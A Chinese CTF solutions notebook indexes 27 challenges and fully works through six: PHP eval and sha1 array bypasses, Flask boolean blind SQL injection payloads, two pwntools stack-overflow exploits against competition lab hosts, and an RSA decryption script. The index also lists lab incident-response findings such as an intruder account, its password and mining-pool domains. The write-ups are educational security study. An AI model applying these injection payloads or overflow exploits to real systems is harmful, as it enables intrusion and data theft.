---
AIGC:
  ContentProducer: '001191110102MAD55U9H0F10002'
  ContentPropagator: '001191110102MAD55U9H0F10002'
  Label: '1'
  ProduceID: 'a6f73e30-0d99-41f3-94a6-b8643f77caf6'
  PropagateID: 'a6f73e30-0d99-41f3-94a6-b8643f77caf6'
  ReservedCode1: 'fc6a0e3b-c0b2-41a6-b4b0-435ab10c3e8f'
  ReservedCode2: 'fc6a0e3b-c0b2-41a6-b4b0-435ab10c3e8f'
---

# CTF 解题笔记本

> 记录比赛中的每一道题目：解题思路、脚本、知识点和可复用的技巧。
> 解题脚本按题型分类存放：`Web/` `PWN/` `Crypto/` `Reverse/`，每题独立子目录。

## 目录

| # | 类型 | 题目 | Flag | 脚本 |
|---|------|------|------|------|
| 1 | Web | 可变变量 + eval | `flag{03bf91...}` | — |
| 2 | Web | sha1 数组绕过 | `flag{f2bbcc...}` | — |
| 3 | Web | Flask 布尔盲注 | `flag{4e8a47...}` | [blind_sqli.py](Web/03-flask-blind-sqli/blind_sqli.py) |
| 4 | PWN | 栈溢出 + 后门 | `CTF2{fd5d48...}` | [exploit.py](PWN/04-ret2text/exploit.py) |
| 5 | PWN | 栈溢出 + 浮点绕过 | `CTF2{619d0c...}` | [exploit.py](PWN/05-float-bypass/exploit.py) |
| 6 | Crypto | RSA 基础解密 | `55774466...` | [rsa_toolkit.py](Crypto/06-rsa-basic/rsa_toolkit.py) |
| 7 | Web | 正则混淆 + Base64 | payload 已验证 | — |
| 8 | Web | UNION 回显注入 | `CTF2{4272c3...}` | [union_sqli.py](Web/08-sqli-union/union_sqli.py) |
| 9 | Web | 逻辑绕过 + Cookie | `CTF2{bb4ae5...}` | — |
| 10 | Reverse | Java 字节码逆向 | `This_is_the_flag_!` | — |
| 11 | Reverse | pyc 反编译 | `GWHT{Just_Re...}` | — |
| 12 | Reverse | ELF 自修改+AES+MD5 | `flag{924a9a...}` | [solve.py](Reverse/12-elf-aes-md5/solve.py) |
| 13 | Reverse | PE 四阶段加密链 | `flag{BruteForce...}` | [solve.py](Reverse/13-pe-encryption-chain/solve.py) |
| 14 | Crypto | 燕言燕语 Hex+维吉尼亚 | `bjd{yanzi_jiushige_shabi}` | [solve.py](Crypto/14-bjdctf-yanzi/solve.py) |
| 15 | Crypto | 老文盲了 生僻字拼音 | `BJD{淛匶襫黼瀬鎶軄鶛驕鳓哵}` | [solve.py](Crypto/15-bjdctf-laowenmang/solve.py) |
| 16 | Crypto | 仿射密码+模逆元 | `flag{c29yY2VyeQ==}` | [solve.py](Crypto/16-affine-cipher/solve.py) |
| 17 | Web | 流量分析 SQL盲注还原 | `flag{c84bb04a-...}` | [solve.py](Web/17-traffic-analysis/solve.py) |
| 18 | IR | 蚁剑Webshell流量分析 | `DASCTF{f3f32f43...}` | [solve.py](IR/18-simpleflow-antsword/solve.py) |
| 19 | Crypto | easyencode 多层编码 | `Dest0g3{Deoding_...}` | [solve.py](Crypto/19-easyencode/solve.py) |
| 20 | Web | 文件上传 任意文件读取 | `CTF2{1cd01c68...}` | [solve.py](Web/20-file-upload-llf/solve.py) |
| 21 | PWN | bypwn 栈溢出+shellcode | `CTF2{82c990a5...}` | [exploit.py](PWN/06-bypwn/exploit.py) |
| 22 | PWN | easyheap 堆溢出+Fastbin Attack | `CTF2{eeeec215...}` | [exploit.py](PWN/07-easyheap/exploit.py) |
| 23 | IR | PCAP Arcanum 流量取证工具 | `DASCTF{f3f32f43...}` | [pcap_arcanum.py](IR/19-pcap-arcanum/pcap_arcanum.py) |
| 24 | IR | Redis未授权访问应急响应 | `flag{thisismybaby}` `flag{kfcvme50}` `flag{P@ssW0rd_redis}` | [ir_scan.py](IR/20-redis-incident/ir_scan.py) |
| 25 | IR | Windows Web应急响应 | IP:`192.168.126.1` 账户:`hack168$` 密码:`rebeyond` 矿池:`wakuang.zhigongshanfang.top` | [win_web_ir.py](IR/21-win-web-ir/win_web_ir.py) |
| 26 | IR | Linux Web应急响应 (PHPEMS考试系统) | IP:`192.168.20.131` 密码:`Network@2020` flag1:`flag1{Network@_2020_Hack}` flag2:`flag{bL5Frin6...}` flag3:`flag{5LourqoF...}` | [linux_web_ir2.py](IR/22-linux-web-ir2/linux_web_ir2.py) |
| 27 | IR | Windows挖矿应急响应 (c3pool) | IP:`192.168.115.131` 时间:`2024-05-21 20:25:22` 端口:`3389` 矿池:`auto.c3pool.org` 钱包:`4APXVhuk...` | — |

## 统计

- **总题数**：27
- **Web**：8 题（PHP 5 + Flask 1 + SQL 1 + 流量分析 1）
- **PWN**：4 题（栈溢出 Ret2Text 系列 + Ret2Shellcode + 堆溢出 Fastbin）
- **Crypto**：5 题（RSA + 维吉尼亚密码 + 生僻字拼音 + 仿射密码 + 多层编码）
- **Reverse**：4 题（Java / Python / ELF / PE）
- **IR（应急响应）**：5 题（Webshell 流量分析 + 自动化流量取证工具 + Redis未授权访问 + Windows Web应急响应 + Linux Web应急响应PHPEMS）
- **IDA Pro 9.3** 用于 PWN 和 Reverse 题目的反编译分析
- **capstone** 用于 stripped ELF 的线性反汇编（PWN 第22题）
- **scapy + pycryptodome** 用于 IR 流量分析和加密通信解码
- **paramiko** 用于 IR 远程SSH连接靶机排查（第24题起）
- **pyinstxtractor + uncompyle6** 用于 PyInstaller 打包的 Python exe 逆向（第25题）
- **MD5 + pcap strings** 用于 Linux Web IR 取证（第26题）

---

## 第1题：PHP 可变变量 + eval 代码执行

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | Web - PHP 代码审计 |
| 难度 | 入门 |
| 日期 | 2026-07-30 |

### 题目源码

```
<?php  

error_reporting(0);
include "flag1.php";
highlight_file(__file__);
if(isset($_GET['args'])){
    $args = $_GET['args'];
    if(!preg_match("/^\w+$/",$args)){
        die("args error!");
    }
    eval("var_dump($$args);");
}
?>
```

### 解题思路

**1. 代码审计要点**

- `preg_match("/^\w+$/", $args)`：正则限制输入只能为单词字符（字母、数字、下划线），无法注入特殊字符
- `$$args`：PHP 可变变量（Variable Variables），若 `$args = "foo"`，则 `$$args` 等价于 `$foo`
- `eval("var_dump($$args);")`：将可变变量以 var_dump 形式输出

**2. 绕过思路**

正则只允许 `\w+`，无法直接调用函数或注入代码。但 PHP 内置了一个超全局数组 `$GLOBALS`，它保存了所有全局变量的引用，包括通过 `include "flag1.php"` 引入的 flag 变量。而 `GLOBALS` 完全由单词字符组成，完美通过正则检查。

**3. 执行流程**

```
args = "GLOBALS"
  ↓ 通过正则 /^\w+$/
$$args = $GLOBALS
  ↓ 可变变量解析
eval("var_dump($GLOBALS);")
  ↓ 输出所有全局变量
flag 暴露在输出中
```

### 解题 Payload

```
?args=GLOBALS
```

### 运行结果

```
array(7) {
  ["_GET"]=> array(1) { ["args"]=> string(7) "GLOBALS" }
  ["_POST"]=> array(0) { }
  ["_COOKIE"]=> array(0) { }
  ["_FILES"]=> array(0) { }
  ["ZFkwe3"]=> string(38) "flag{03bf915408d2349051395522ea5f4cf3}"
  ["args"]=> string(7) "GLOBALS"
  ["GLOBALS"]=> *RECURSION*
}
```

Flag: `flag{03bf915408d2349051395522ea5f4cf3}`

### 涉及知识点

| 知识点 | 说明 |
|--------|------|
| PHP 可变变量 | `$$var` 会先解析 `$var` 的值，再将结果作为变量名访问对应的变量 |
| PHP 超全局数组 | `$GLOBALS` 保存所有全局变量的引用，包括用户自定义的和系统内置的 |
| 正则绕过 | `\w` 匹配 `[a-zA-Z0-9_]`，`GLOBALS` 纯字母可通过 |
| eval 代码执行 | `eval()` 将字符串作为 PHP 代码执行，是常见漏洞入口 |
| error_reporting(0) | 关闭错误报告，隐藏潜在报错信息 |

### 同类变体与扩展

- 若过滤了 `GLOBALS`，可尝试其他超全局变量：`_GET`、`_POST`、`_SERVER` 等（但只能看到对应数组内容，不一定含 flag）
- 若 flag 变量名已知（如 `$flag`），可直接 `?args=flag` 访问
- 更严格过滤场景需结合其他 PHP 特性（如 `get_defined_vars()`、`get_defined_functions()` 等，但需能调用函数）

## 第2题：PHP sha1 数组绕过 + 逻辑比较

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | Web - PHP 代码审计 |
| 难度 | 入门 |
| 日期 | 2026-07-30 |

### 题目源码

```
<?php
highlight_file('flag.php');
$_GET['id'] = urldecode($_GET['id']);
$flag = 'flag{xxxxxxxxxxxxxxxxxx}';
if (isset($_GET['uname']) and isset($_POST['passwd'])) {
    if ($_GET['uname'] == $_POST['passwd'])

        print 'passwd can not be uname.';

    else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&($_GET['id']=='margin'))

        die('Flag: '.$flag);

    else

        print 'sorry!';

}
?>
```

### 解题思路

**1. 代码审计要点**

- `urldecode($_GET['id'])`：对 id 做一次 URL 解码，最终需等于 `margin`
- `$_GET['uname'] == $_POST['passwd']`：弱比较，uname 和 passwd 不能相等
- `sha1($uname) === sha1($passwd)`：严格比较两个 SHA1 哈希，必须完全相同
- `$_GET['id']=='margin'`：id 必须等于 `margin`
- `&` 运算符：位与（非逻辑与 `&&`），但因 `===` 优先级更高，实际等价于 `(sha1===sha1) & (id==margin)`

**2. 核心漏洞：sha1() 数组绕过**

`sha1()` 函数接收数组参数时无法计算哈希，返回 `NULL` 并触发警告（默认不显示）：

```
sha1(array('a')) → NULL
sha1(array('b')) → NULL
NULL === NULL   → TRUE   ✓
```

同时，不同数组之间的 `==` 比较为 `FALSE`，绕过第一层检查：

```
array('a') == array('b') → FALSE  ✓ 通过"不相等"检查
```

**3. 运算符优先级陷阱**

```
sha1($uname) === sha1($passwd) & ($id == 'margin')
```

这里用的是 `&`（位与）而非 `&&`（逻辑与）。由于 `===` 优先级高于 `&`，实际解析为：

```
(sha1($uname) === sha1($passwd)) & ($id == 'margin')
```

`TRUE & TRUE` → `1`（真值），效果等同于 `&&`，不影响解题。

**4. 执行流程**

```
uname[]=1, passwd[]=2, id=margin
  ↓
uname(array) != passwd(array)  → TRUE, 通过第一层
  ↓
sha1(array) → NULL === NULL    → TRUE
id == 'margin'                 → TRUE
TRUE & TRUE                    → 1 (truthy)
  ↓
die('Flag: ...')  → 获得 flag
```

### 解题 Payload

| 参数 | 值 | 方式 |
|------|-----|------|
| id | `margin` | GET |
| uname | `uname[]=1` | GET（传数组） |
| passwd | `passwd[]=2` | POST（传数组） |

请求示例：

```
GET: ?id=margin&uname[]=1
POST: passwd[]=2
```

### 涉及知识点

| 知识点 | 说明 |
|--------|------|
| sha1/md5 数组绕过 | 哈希函数接收数组返回 NULL，`NULL === NULL` 为 TRUE |
| PHP 弱类型比较 | `==` 会自动类型转换，数组比较先比键值对数量和内容 |
| PHP 严格比较 | `===` 要求类型和值都相同，`NULL === NULL` 为 TRUE |
| 位运算符 & vs 逻辑运算符 && | `&` 是位与，`&&` 是逻辑与，优先级不同但此处效果一致 |
| urldecode 二次解码 | 服务器已自动解码一次，代码再解码一次，可能用于双编码绕过场景 |
| 数组参数传递 | `uname[]=1` 在 PHP 中将参数解析为数组 |

### 运行结果

```
curl "http://目标地址/?id=margin&uname[]=1" -d "passwd[]=2"

Flag: flag{f2bbcca065a83153280a94f74bb0ae81}
```

### 同类变体与扩展

- `md5()` 同样存在数组绕过，`md5(array)` 也返回 `NULL`
- 若条件改为 `sha1($uname) == sha1($passwd)`（弱比较），除数组绕过外还可寻找 SHA1 碰撞（理论可行，实际极难）
- 若过滤了数组参数，可研究 SHA1 碰撞文件（如 SHAttered 攻击中的两个 PDF）
- `urldecode` 双编码技巧：`?id=%256Dargin` → 服务器解码为 `%6Dargin` → urldecode 解码为 `margin`，可用于绕过 WAF 对 `margin` 关键词的拦截

## 第3题：Flask 布尔盲注 SQL 注入

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | Web - SQL 注入（布尔盲注） |
| 难度 | 中等 |
| 日期 | 2026-07-30 |

### 题目描述

Flask + Werkzeug 应用，首页提示"开发者忘记删除测试账号了"。入口路径 `/admin/login`，登录后 `/admin` 提示"flag 在 flag 表中"。登录表单有基于时间的 SQL 注入过滤器。

### 解题思路

**1. 信息收集**

- Flask/Werkzeug 调试模式开启，JSON 请求触发报错可看到源码
- 源码泄露：`app.py` 使用 `filter_time_based_sql_injection` 过滤 SLEEP/WAITFOR/DELAY/RAND/BENCHMARK
- 但 UNION SELECT、OR、AND 等关键词未被过滤
- 测试账号：`test / 123456`

**2. SQL 注入验证**

在用户名字段注入，利用布尔条件差异判断：

```
test' AND 1=1 AND '1'='1    → 登录成功（条件为真）
test' AND 1=2 AND '1'='1    → 登录失败（条件为假）
```

**3. 布尔盲注提取 flag**

利用 `SUBSTRING` + `ASCII` + 二分搜索逐字符提取：

```
# 判断 flag 长度
test' AND (SELECT LENGTH(flag) FROM flag LIMIT 1)>N AND '1'='1

# 提取每个字符（ASCII 二分搜索）
test' AND ASCII(SUBSTRING((SELECT flag FROM flag LIMIT 1),pos,1))>N AND '1'='1
```

二分搜索将每个字符的查询次数从 ~95 降至 ~7，38 字符的 flag 约需 266 次请求。

**4. 注意事项**

- Python `urllib.parse.urlencode` 会将单引号编码为 `%27`，导致 SQL 注入失效
- 需使用 `http.client` 手动构造请求体，保持原始单引号不编码
- `SUBSTRING` 在 MySQL 和 SQLite 中均可使用

### 解题 Payload

```
# 布尔盲注 - 验证条件
POST /admin/login
username=test' AND (SELECT COUNT(*) FROM flag)>0 AND '1'='1&password=123456

# 提取 flag 逐字符（二分搜索 ASCII 值）
username=test' AND ASCII(SUBSTRING((SELECT flag FROM flag LIMIT 1),1,1))>90 AND '1'='1&password=123456
```

### 运行结果

```
Flag length: 38
[1] f => f
[2] l => fl
...
[38] } => flag{4e8a47682414b4fba441d2a4108ba632}
```

Flag: `flag{4e8a47682414b4fba441d2a4108ba632}`

### 涉及知识点

| 知识点 | 说明 |
|--------|------|
| 布尔盲注 | 通过页面返回差异（登录成功/失败）判断 SQL 条件真假 |
| 二分搜索优化 | ASCII 范围 32-126，二分搜索每字符约 7 次请求 |
| Werkzeug 调试模式泄露源码 | Flask debug=True 时错误页暴露源码路径和变量名 |
| SQL 注入过滤器绕过 | 仅过滤时间盲注关键词，未过滤 UNION/AND/OR/SELECT |
| URL 编码陷阱 | Python urllib 会编码单引号导致注入失效，需用 http.client |
| SUBSTRING + ASCII | 经典字符提取组合，MySQL 和 SQLite 均支持 |

### 同类变体与扩展

- 若过滤了引号，可用 `CHAR()` 函数替代
- 若过滤了 SUBSTRING，可用 `MID()`、`LEFT()`、`RIGHT()` 替代
- 若过滤了 AND，可用 `&&` 或嵌套条件替代
- 时间盲注：当页面无布尔差异时，用 `IF(condition, SLEEP(3), 0)` 制造延迟差异
- 报错注入：用 `extractvalue()`、`updatexml()` 等函数将数据暴露在错误信息中

## 第4题：PWN 栈溢出 + 后门函数（IDA 辅助分析）

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | PWN - 栈溢出（Ret2Text） |
| 难度 | 入门 |
| 日期 | 2026-07-30 |
| 工具 | IDA Pro 9.3（反编译）、pwntools（exploit） |

### 题目描述

ELF 64位可执行文件，通过 `ncat --ssl <host> 9999` 远程连接。程序输出一段欢迎信息和一个地址泄露，然后等待用户输入。

### IDA 反编译结果

**main 函数 (0x40061D)**
```c
__int64 main() {
    char s[64];                              // [rbp-80h] 缓冲区
    write(1, "-Warm Up-\n", 10);
    write(1, "WOW:", 4);
    sprintf(s, "%p\n", sub_40060D);          // 泄露后门函数地址
    write(1, s, 9);
    write(1, ">", 1);
    return gets();                           // gets() 无长度限制 → 栈溢出!
}
```

**后门函数 sub_40060D (0x40060D)**
```c
int sub_40060D() {
    return system("cat flag.txt");           // 直接读取 flag!
}
```

### 解题思路

**1. 漏洞分析**

- `gets()` 读取输入到 `[rbp-0x40]`，无长度限制，导致栈溢出
- 程序内置后门函数 `sub_40060D`，直接调用 `system("cat flag.txt")`
- 程序通过 `sprintf(s, "%p", sub_40060D)` 主动泄露后门地址
- ELF 无 PIE（固定基址 0x400000），后门地址恒为 0x40060D

**2. 偏移量计算**

从 IDA 汇编分析：
```
0x400692: lea rax, [rbp+var_40]    ; gets 输入缓冲区在 rbp-0x40
0x400696: mov rdi, rax
0x400699: call _gets
```

- gets 缓冲区起始：`rbp - 0x40`
- 到 saved rbp 的距离：0x40 = 64 字节
- 到返回地址的距离：0x40 + 8 = 72 字节（0x48）

**3. 栈对齐处理**

x86-64 的 `system()` 在某些 libc 版本中要求 16 字节栈对齐。直接跳转到后门函数入口可能导致 `movaps` 指令崩溃。解决方案：在 payload 中添加一个 `ret` gadget 进行栈对齐。

```
ret gadget 地址：0x4006A4（main 函数末尾的 retn 指令）
```

**4. Payload 结构**

```
[填充 72 字节 'A'] + [ret gadget 0x4006A4] + [后门地址 0x40060D]
     64字节缓冲区+8字节rbp        8字节栈对齐         8字节返回地址
```

### 解题脚本

```python
from pwn import *
import ssl, socket

HOST = '39f71dab837b6029aa64ce18.tcp-ctf2.dasctf.com'
PORT = 9999

BACKDOOR_ADDR = 0x40060D      # sub_40060D: system("cat flag.txt")
RET_GADGET = 0x4006A4         # ret 指令（栈对齐）
OFFSET = 0x40 + 8             # 72 字节：64 填充 + 8 saved rbp

# SSL 连接
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ssl_sock = ctx.wrap_socket(sock, server_hostname=HOST)
ssl_sock.connect((HOST, PORT))

# 接收泄露
data = ssl_sock.recv(4096)
print(f"Received: {data}")

# 构造 payload
payload = b'A' * OFFSET + p64(RET_GADGET) + p64(BACKDOOR_ADDR)
ssl_sock.send(payload + b'\n')

# 接收 flag
import time; time.sleep(2)
print(ssl_sock.recv(4096).decode())
```

### 运行结果

```
[*] Received: b'-Warm Up-\nWOW:0x40060d\n>'
[*] Leaked backdoor address: 0x40060d
[*] Payload length: 88
[*] Response: CTF2{fd5d48ff-5eb9-4ed2-b9d6-3aca695e0a88}
```

Flag: `CTF2{fd5d48ff-5eb9-4ed2-b9d6-3aca695e0a88}`

### 涉及知识点

| 知识点 | 说明 |
|--------|------|
| 栈溢出（Stack Overflow） | gets() 无长度限制，可覆盖返回地址 |
| Ret2Text | 跳转到程序内置的代码段（后门函数）执行 |
| IDA Pro 反编译 | 使用 idat 批处理模式自动反编译，提取伪代码和汇编 |
| 栈对齐（Stack Alignment） | x86-64 下 system() 要求 16 字节对齐，需 ret gadget 修正 |
| 地址泄露 | 程序通过 %p 格式化输出后门函数地址 |
| ELF 无 PIE | 固定基址 0x400000，函数地址不变，无需信息泄露 |
| pwntools | p64() 打包地址，构造二进制 payload |

### 同类变体与扩展

- 若无后门函数，需 Ret2libc：泄露 libc 基址 → 计算 system() 和 /bin/sh 地址 → 构造 ROP 链
- 若有 Canary 保护，需先泄露 canary 值再溢出
- 若有 PIE，需先泄露代码段基址
- 若使用 `one_gadget`，可直接跳转到 libc 中 execve("/bin/sh") 的 one-gadget RCE 地址
- IDA 批处理脚本可进一步扩展：自动识别危险函数（gets/strcpy/sprintf）、自动计算偏移量

## 第5题：PWN 栈溢出 + 浮点数条件绕过（IDA 辅助分析）

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | PWN - 栈溢出（Ret2Text 变体） |
| 难度 | 入门 |
| 日期 | 2026-07-31 |
| 工具 | IDA Pro 9.3（反编译）、pwntools（exploit） |

### 题目描述

ELF 64位可执行文件，远程连接后提示 "Let's guess the number."，要求猜一个数字。程序内含 `system("cat /flag")` 调用，但浮点数条件判断使正常流程无法到达。

### IDA 反编译结果

**func 函数 (0x400676)**
```c
int func() {
    puts("Let's guess the number.");
    gets();                                    // gets() 栈溢出！缓冲区在 rbp-0x30
    if (11.28125 == 0.0)                       // 浮点数比较，永远为 FALSE
        return system("cat /flag");            // 死代码，正常走不到
    else
        return puts("Its value should be 11.28125");
}
```

**关键汇编**
```asm
0x400691: lea rax, [rbp+var_30]        ; gets 输入缓冲区 rbp-0x30
0x40069D: call _gets                   ; 栈溢出点
0x4006A7: ucomiss xmm0, cs:dword_4007F4  ; 11.28125 vs 0.0
0x4006BC: jnz  short loc_4006CF        ; 跳转到 else 分支
0x4006BE: mov edi, offset command       ; "cat /flag" ← 目标地址!
0x4006C3: mov eax, 0
0x4006C8: call _system
```

### 解题思路

**1. 漏洞分析**

- `gets()` 读取到 `[rbp-0x30]`，无长度限制 → 栈溢出
- 浮点数比较 `11.28125 == 0.0` 永远为 FALSE → 正常流程走不到 `system("cat /flag")`
- 无论输入什么数字，都会输出 "Its value should be 11.28125"

**2. 绕过方式**

不需要满足浮点数条件！直接通过栈溢出覆盖返回地址，跳转到 `system("cat /flag")` 的调用点 `0x4006BE`。

**3. 偏移量计算**

从 IDA 汇编：
- gets 缓冲区起始：`rbp - 0x30`
- 到 saved rbp：0x30 = 48 字节
- 到返回地址：0x30 + 8 = 56 字节

**4. Payload 结构**

```
[填充 56 字节 'A'] + [0x4006BE]
     48字节缓冲区+8字节rbp    system("cat /flag") 调用点
```

注意：跳转目标是 `0x4006BE`（`mov edi, "cat /flag"` 指令），而非函数开头 `0x400676`。这样直接进入 system 调用，无需满足任何条件。

### 解题脚本

```python
from pwn import *
import ssl, socket

HOST = 'f50ba9f58e7c20a5aa07c700.tcp-ctf2.dasctf.com'
PORT = 9999

SYSTEM_CALL = 0x4006BE       # mov edi, "cat /flag"; call system
OFFSET = 0x30 + 8            # 56 字节

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ssl_sock = ctx.wrap_socket(sock, server_hostname=HOST)
ssl_sock.connect((HOST, PORT))

# Receive prompt
data = ssl_sock.recv(4096)
print(data.decode())

# Send payload
payload = b'A' * OFFSET + p64(SYSTEM_CALL)
ssl_sock.send(payload + b'\n')

# Get flag
import time; time.sleep(2)
print(ssl_sock.recv(4096).decode())
```

### 运行结果

```
[*] Received: b"Let's guess the number.\n"
[*] Result: Its value should be 11.28125
CTF2{619d0c3f-3afe-4e01-8217-81ccc77243ab}
```

Flag: `CTF2{619d0c3f-3afe-4e01-8217-81ccc77243ab}`

### 涉及知识点

| 知识点 | 说明 |
|--------|------|
| gets() 栈溢出 | 无长度限制的输入函数，经典溢出源 |
| 浮点数条件绕过 | 11.28125 == 0.0 永远为 FALSE，正常流程不可达 |
| Ret2Text（指令片段跳转） | 不跳函数开头，直接跳到 system 调用的 gadget 地址 |
| IDA 精确定位 gadget | 通过反编译/汇编找到 `mov edi, "cat /flag"` 的精确地址 |
| ucomiss 指令 | SSE 浮点数比较指令，影响 ZF/PF/CF 标志位 |
| 无 PIE | 固定地址 0x400000，可直接硬编码跳转地址 |

### 与第4题对比

| 特征 | 第4题 (pwn1) | 第5题 (pwn2) |
|------|---------------|---------------|
| 缓冲区位置 | rbp-0x40 | rbp-0x30 |
| 溢出偏移 | 72 字节 | 56 字节 |
| 后门函数 | 独立函数 sub_40060D | 死代码片段（条件不可达） |
| 绕过方式 | 覆盖返回地址跳函数 | 覆盖返回地址跳 gadget |
| 栈对齐 | 需要 ret gadget | 不需要 |
| 地址泄露 | 程序主动泄露 | 无泄露（也不需要） |

### 同类变体与扩展

- 若目标需要多个参数，可构造 ROP 链逐个设置 rdi/rsi/rdx
- 若 `system()` 不可用，可找 `execve()` 的 one-gadget
- 浮点数条件题型的其他解法：直接覆盖栈上的浮点变量 var_4 为 0.0

## 第6题：RSA 基础解密

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | Crypto - RSA |
| 难度 | 入门 |
| 日期 | 2026-07-31 |
| 工具 | gmpy2（大数加速）、pycryptodome（编码转换） |

### 题目描述

"Math is cool! Use the RSA algorithm to decode the secret message, c, p, q, and e are parameters for the RSA algorithm."

直接给出 RSA 的全部参数：p、q、e、c，要求解密还原明文。

### 题目参数

```
p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483
q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407
e = 65537
c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034
```

### 解题思路

**1. RSA 算法回顾**

RSA 加解密流程：
- 公钥：`(n, e)`，其中 `n = p × q`
- 加密：`c = m^e mod n`
- 私钥：`d = e⁻¹ mod φ(n)`，其中 `φ(n) = (p-1)(q-1)`
- 解密：`m = c^d mod n`

**2. 本题特点**

题目直接给出了 p 和 q（无需因式分解 n），因此可以直接计算 φ(n)，再求私钥 d，最后解密。

**3. 库选择与性能对比**

本题使用三个核心库替代纯 Python 内置函数：

| 库 | 用途 | 对比 Python 内置 |
|----|------|-----------------|
| `gmpy2` | 模逆元 `invert()`、模幂 `powmod()`、开方 `iroot()`、素性检测 | 快 **6.2x**（500次RSA运算: 0.35s vs 2.18s） |
| `pycryptodome` | `long_to_bytes()` / `bytes_to_long()` 编码转换 | 比手写 `int.to_bytes()` 更方便，自动处理长度 |
| `sympy` | `factorint()` 因式分解（Pollard rho + ECM） | 离线可用，适合中小规模 n |

gmpy2 底层是 GMP (GNU Multiple Precision) C 库，大数运算远快于 Python 的纯整数实现。

**4. 解题步骤**

```
Step 1: n = p × q
Step 2: φ(n) = (p-1) × (q-1)
Step 3: d = e⁻¹ mod φ(n)        ← gmpy2.invert(e, phi)
Step 4: m = c^d mod n            ← gmpy2.powmod(c, d, n)
Step 5: 验证 m^e mod n == c      ← 确认解密正确
```

### 解题脚本

> 完整脚本保存为 `rsa_toolkit.py`，封装了 RSA 解密 + 常见攻击模块，可复用。

```python
#!/usr/bin/env python3
"""
CTF RSA 解题通用脚本库 (rsa_toolkit.py)
封装 RSA 常用操作，优先使用 gmpy2 加速大数运算，
无 gmpy2 时自动回退到 Python 内置函数。

核心依赖: gmpy2, pycryptodome
可选依赖: sympy (因式分解)
安装: pip install gmpy2 pycryptodome sympy
"""

# ---- 依赖加载（优先 gmpy2，回退内置）----
try:
    import gmpy2
    _HAS_GMPY2 = True
except ImportError:
    _HAS_GMPY2 = False

from Crypto.Util.number import long_to_bytes, bytes_to_long

# ---- 基础运算 ----

def modinv(a, m):
    """模逆元 a^{-1} mod m"""
    if _HAS_GMPY2:
        return int(gmpy2.invert(a, m))
    return pow(a, -1, m)

def powmod(base, exp, mod):
    """模幂 base^exp mod mod"""
    if _HAS_GMPY2:
        return int(gmpy2.powmod(base, exp, mod))
    return pow(base, exp, mod)

def iroot(n, k):
    """整数 k 次方根，返回 (root, is_exact)"""
    if _HAS_GMPY2:
        r, exact = gmpy2.iroot(n, k)
        return int(r), bool(exact)
    # 回退：二分搜索
    lo, hi = 0, 1 << ((n.bit_length() + k - 1) // k + 1)
    while lo < hi:
        mid = (lo + hi) // 2
        if mid ** k < n:
            lo = mid + 1
        else:
            hi = mid
    return lo, (lo ** k == n)

# ---- RSA 核心 ----

def rsa_compute_d(p, q, e):
    """已知 p, q, e 计算私钥 d"""
    phi = (p - 1) * (q - 1)
    return modinv(e, phi)

def rsa_decrypt(c, d, n):
    """RSA 解密: m = c^d mod n"""
    return powmod(c, d, n)

# ---- 第6题: RSA 基础解密 ----

if __name__ == '__main__':
    p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483
    q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407
    e = 65537
    c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034

    print(f"gmpy2 加速: {'已启用' if _HAS_GMPY2 else '未安装(回退内置)'}")

    n = p * q
    d = rsa_compute_d(p, q, e)
    m = rsa_decrypt(c, d, n)

    # 验证
    assert powmod(m, e, n) == c, "验证失败!"

    print(f"n   = {n}")
    print(f"d   = {d}")
    print(f"m   = {m}")
    print(f"hex = {hex(m)}")
    print(f"bytes = {long_to_bytes(m)}")
    print(f"验证: m^e mod n == c  ✓")
    print(f"\nSecret message: {m}")
```

> 此外 `rsa_toolkit.py` 还封装了以下攻击模块，供后续 RSA 变体题复用：
> - `factorize_n(n)` — 因式分解（sympy 本地 + factordb 在线）
> - `attack_small_e(c, e, n)` — 小加密指数攻击（直接开方）
> - `attack_common_modulus(n, e1, c1, e2, c2)` — 共模攻击
> - `attack_wiener(e, n)` — Wiener 攻击（连分数展开恢复 d）

### 运行结果

```
gmpy2 加速: 已启用
n   = 114573516752272714750064227635008832737477859608443481000717283425702025029279291376859256856603741797722497252841363753834114679306784379319341824813349417007577541466886971550474580368413974382926969910999462429631003527365143148445405716553105750338796691010126879918594076915709977585368841428779903869581
d   = 56632047571190660567520341028861194862411428416862507034762587229995138605649836960220619903456392752115943299335385163216233744624623848874235303309636393446736347238627793022725260986466957974753004129210680401432377444984195145009801967391196615524488853620232925992387563270746297909112117451398527453977
m   = 5577446633554466577768879988
hex = 0x12058e43d9e0c22559c19774
bytes = b'\x12\x05\x8eC\xd9\xe0\xc2%Y\xc1\x97t'
验证: m^e mod n == c  ✓

Secret message: 5577446633554466577768879988
```

明文转为 bytes 后不构成可读 ASCII 文本，说明本题的 secret message 就是这个整数本身。

Flag: `5577446633554466577768879988`

### 环境依赖

```
# requirements.txt
gmpy2>=2.1            # GMP 大数运算加速，比Python内置快6x+
pycryptodome>=3.20    # long_to_bytes/bytes_to_long, RSA/AES等
sympy>=1.12           # factorint() 因式分解, isprime() 素性检测
pwntools>=4.12        # PWN题远程连接
```

安装方式：
```bash
# 在线安装
pip install -r requirements.txt

